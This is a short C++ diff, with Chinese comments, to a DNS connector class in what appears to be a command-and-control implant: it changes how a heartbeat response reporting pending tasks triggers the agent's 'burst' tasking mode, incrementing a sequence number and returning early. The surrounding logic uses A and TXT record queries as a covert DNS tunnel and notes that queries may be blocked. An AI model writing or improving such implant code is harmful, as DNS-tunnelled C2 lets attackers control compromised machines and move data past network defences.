@@ -801,9 +801,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 return;
             }
             // 有任务，标记 pending 以触发 burst 模式
+            // CRITICAL: 设置 hasPendingTasks 后立即返回，不要在同一个 SendData 中执行 GET
+            // 这样 MainAgent 才能在下一轮循环检查 IsBusy() 并进入 burst 模式
             this->hasPendingTasks = TRUE;
-            DnsDebugLogf("[DNS] [HB-RSP] has_tasks ip=%u.%u.%u.%u", 
+            this->seq++; // 更新 seq，因为心跳已完成
+            DnsDebugLogf("[DNS] [HB-RSP] has_tasks ip=%u.%u.%u.%u - return to trigger burst", 
                          ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
+            return; // 返回让 MainAgent 检查 IsBusy() 并进入 burst
         } else {
             // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
             this->lastQueryOk = FALSE;
